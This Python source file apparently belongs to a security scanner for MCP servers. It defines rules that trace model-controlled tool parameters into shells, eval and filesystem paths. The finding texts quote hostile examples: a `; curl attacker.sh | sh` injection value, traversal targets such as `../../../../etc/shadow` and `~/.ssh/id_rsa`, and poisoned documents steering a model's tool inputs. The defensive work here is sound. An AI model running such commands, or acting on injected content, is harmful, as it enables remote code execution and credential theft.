"""MCP05 — Command Injection & Execution.

MCP03-001 reports a dangerous parameter and a dangerous sink *in the same handler*. That is a
shape, and shapes have false positives: a tool that takes a `target` and runs a fixed `make all`
matches it and is fine.

MCP05 asks the harder question and only fires when the answer is yes: does the value the model
chose actually reach the thing that executes? The Python parser answers with a real AST — it
follows the parameter through assignments, f-strings, `%`, `.format()` and `.join()` into the sink.
The TS/JS parser answers by matching the parameter's name inside the sink's arguments, which is
weaker evidence, so those findings are reported at lower confidence and say so.

The analysis is intraprocedural. Taint that escapes through a helper function is not tracked, so
this under-reports rather than over-reports — the right way to be wrong for something meant to run
in CI.
"""

from __future__ import annotations

from collections.abc import Iterable, Iterator

from ..core.context import ScanContext
from ..core.findings import Finding, Severity
from ..parsers.common import EXEC, FS_READ, FS_WRITE, SourceFacts, TaintFlow, ToolDef
from .base import rule


def _owner(facts: SourceFacts, flow: TaintFlow) -> ToolDef | None:
    """Which tool a flow belongs to.

    A low-level `@server.call_tool()` dispatcher implements every tool in one function, so the flow
    can't be attributed by span. There the parameter's name is the link: the flow came from
    `arguments["command"]`, so it belongs to whichever tool declares a `command`. If more than one
    does, we can't say which, and we report against the dispatcher rather than guess.
    """
    if flow.tool:
        return next((t for t in facts.tools if t.name == flow.tool), None)

    candidates = [t for t in facts.tools if any(p.name == flow.source for p in t.params)]
    return candidates[0] if len(candidates) == 1 else None


def _injectable(tool: ToolDef | None, flow: TaintFlow) -> bool:
    """Whether the model can actually choose this value.

    A parameter constrained to an `enum` / `Literal` is an allowlist: the model picks from a set the
    author chose, so tracking it into a sink proves nothing. The clean fixture's
    `Literal["standup", "roadmap", "retro"]` interpolated into a path is the canonical example — it
    is a flow, and it is not a vulnerability. When we cannot resolve the tool we keep the flow,
    because we cannot show it is safe.
    """
    if tool is None:
        return True
    param = next((p for p in tool.params if p.name == flow.source), None)
    return param is None or param.is_free_form_string


def _flows(ctx: ScanContext) -> Iterator[tuple[SourceFacts, TaintFlow, ToolDef | None]]:
    for facts in ctx.source_facts.values():
        for flow in facts.taint_flows:
            owner = _owner(facts, flow)
            if _injectable(owner, flow):
                yield facts, flow, owner


def _tool_label(tool: ToolDef | None) -> str:
    return f"`{tool.name}`" if tool else "a tool"


def _trace(flow: TaintFlow, facts: SourceFacts) -> str:
    """`command` (line 8) -> line 10 -> subprocess.run (line 11), as prose."""
    steps = " → ".join(f"line {n}" for n in dict.fromkeys(flow.steps))
    if not flow.proven:
        return (
            f"`{flow.source}` appears in the arguments of `{flow.sink.name}` at "
            f"{facts.path}:{flow.sink.line}"
        )
    return f"`{flow.source}` reaches `{flow.sink.name}` through {steps}"


@rule(
    id="MCP05-001",
    mcp_id="MCP05",
    name="Tool input reaches a shell",
    description="A model-controlled parameter flows into a command interpreter.",
)
def input_reaches_shell(ctx: ScanContext) -> Iterable[Finding]:
    for facts, flow, tool in _flows(ctx):
        sink = flow.sink
        if sink.capability != EXEC or sink.dynamic_eval or not sink.shell:
            continue
        if flow.sanitized:
            continue  # shlex.quote neutralizes the metacharacters; this is the fix, not the bug

        yield Finding(
            rule_id="MCP05-001",
            mcp_id="MCP05",
            severity=Severity.CRITICAL,
            title=f"Tool input `{flow.source}` is executed by a shell",
            description=(
                f"{_trace(flow, facts)}, which runs it through a command interpreter. "
                f"The model chooses `{flow.source}`, and anything that can influence the model — a "
                "poisoned document, a web page it fetched, a file in the workspace — chooses it in "
                f"turn. A value of `; curl attacker.sh | sh` is not an edge case here; it is the "
                "expected consequence. This is not a co-location: the value is tracked from "
                f"{_tool_label(tool)}'s parameter into the sink."
            ),
            file_path=facts.path,
            line=sink.line,
            snippet=sink.raw or None,
            remediation=(
                "Do not build a shell string. Pass the command as an argument list "
                "(`subprocess.run([...], shell=False)`, `execFile`) so the value can never be parsed "
                f"as syntax. If a shell is unavoidable, wrap `{flow.source}` in `shlex.quote()` — and "
                "constrain it to an allowlist anyway, because quoting protects the shell, not the "
                "command you are about to run."
            ),
            cwe_id="CWE-78",
            confidence=0.95 if flow.proven else 0.7,
            metadata={
                "tool": tool.name if tool else "",
                "param": flow.source,
                "sink": sink.name,
                "proven": str(flow.proven).lower(),
            },
        )


@rule(
    id="MCP05-002",
    mcp_id="MCP05",
    name="Tool input reaches a dynamic evaluator",
    description="A model-controlled parameter flows into eval/exec/Function.",
)
def input_reaches_evaluator(ctx: ScanContext) -> Iterable[Finding]:
    for facts, flow, tool in _flows(ctx):
        sink = flow.sink
        if not sink.dynamic_eval:
            continue

        yield Finding(
            rule_id="MCP05-002",
            mcp_id="MCP05",
            severity=Severity.CRITICAL,
            title=f"Tool input `{flow.source}` is evaluated as code",
            description=(
                f"{_trace(flow, facts)}, which evaluates it as source code in the server's own "
                f"process. There is no sandbox here: {_tool_label(tool)} hands the model a Python or "
                "JavaScript interpreter running with the server's privileges, its imports, its open "
                "file handles, and its credentials. Every restriction the tool's schema tries to "
                "impose is advisory once the value lands here."
            ),
            file_path=facts.path,
            line=sink.line,
            snippet=sink.raw or None,
            remediation=(
                f"Remove the evaluator. If `{flow.source}` is a calculation, parse it with `ast."
                "literal_eval()` or a real expression parser that cannot call functions. If it is a "
                "query or filter, implement the operations you intend to support explicitly — an "
                "allowlist of behaviours, not an allowlist of characters."
            ),
            cwe_id="CWE-95",
            confidence=0.95 if flow.proven else 0.7,
            metadata={
                "tool": tool.name if tool else "",
                "param": flow.source,
                "sink": sink.name,
                "proven": str(flow.proven).lower(),
            },
        )


@rule(
    id="MCP05-003",
    mcp_id="MCP05",
    name="Tool input reaches a filesystem path",
    description="A model-controlled parameter is used as a path with no confinement to a root.",
)
def input_reaches_path(ctx: ScanContext) -> Iterable[Finding]:
    for facts, flow, tool in _flows(ctx):
        sink = flow.sink
        if sink.capability not in (FS_READ, FS_WRITE):
            continue

        writing = sink.capability == FS_WRITE
        verb = "written to" if writing else "read from"

        yield Finding(
            rule_id="MCP05-003",
            mcp_id="MCP05",
            severity=Severity.HIGH if writing else Severity.MEDIUM,
            title=f"Tool input `{flow.source}` is used as a filesystem path",
            description=(
                f"{_trace(flow, facts)}, so the file {verb} is the one the model named. Nothing here "
                "confines it to a directory, and `../` means the same thing to the filesystem as it "
                f"does to everyone else — `../../../../etc/shadow` and `~/.ssh/id_rsa` are inside "
                f"{_tool_label(tool)}'s reach."
                + (
                    " Because this is a write, the same primitive overwrites `authorized_keys` or a "
                    "shell profile, which turns file access into code execution."
                    if writing
                    else ""
                )
            ),
            file_path=facts.path,
            line=sink.line,
            snippet=sink.raw or None,
            remediation=(
                "Resolve the path and then *confine* it: `resolved = (root / user_path).resolve()` "
                "followed by a check that `resolved.is_relative_to(root)`. Normalizing alone does "
                "nothing — `os.path.realpath` happily resolves `../../etc/shadow` to `/etc/shadow`. "
                "Reject the call when the resolved path escapes the root; do not try to strip `..` "
                "out of the string."
            ),
            cwe_id="CWE-22",
            confidence=0.85 if flow.proven else 0.6,
            metadata={
                "tool": tool.name if tool else "",
                "param": flow.source,
                "sink": sink.name,
                "proven": str(flow.proven).lower(),
            },
        )
